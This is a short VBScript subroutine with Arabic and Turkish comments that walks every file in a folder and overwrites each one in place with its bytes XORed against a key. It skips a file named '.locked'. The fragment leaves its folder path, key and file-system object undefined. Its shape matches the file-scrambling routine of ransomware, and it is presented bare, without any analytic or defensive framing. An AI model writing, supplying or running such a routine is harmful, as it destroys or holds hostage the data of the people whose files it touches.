Sub ProcessFiles()
    Set folder = fso.GetFolder(folderPath)
    For Each file In folder.Files
        If file.Name <> ".locked" Then
            Dim inputStream, outputStream
            Set inputStream = CreateObject("ADODB.Stream")
            Set outputStream = CreateObject("ADODB.Stream")
            
            ' قراءة الملف / Dosyayı oku
            inputStream.Type = 1 ' Binary
            inputStream.Open
            inputStream.LoadFromFile file.Path
            
            ' معالجة البيانات / Veriyi işle
            outputStream.Type = 1 ' Binary
            outputStream.Open
            
            Dim b
            While Not inputStream.EOS
                b = AscB(inputStream.Read(1))
                ' كتابة البايت بعد تعديله بـ XOR / XOR ile modifiye edilmiş byte'ı yaz
                Dim resultByte(0)
                resultByte(0) = b Xor key
                outputStream.Write resultByte
            Wend
            
            ' حفظ الملف / Dosyayı kaydet
            outputStream.SaveToFile file.Path, 2 ' Overwrite
            
            inputStream.Close
            outputStream.Close
            Set inputStream = Nothing
            Set outputStream = Nothing
        End If
    Next
End Sub
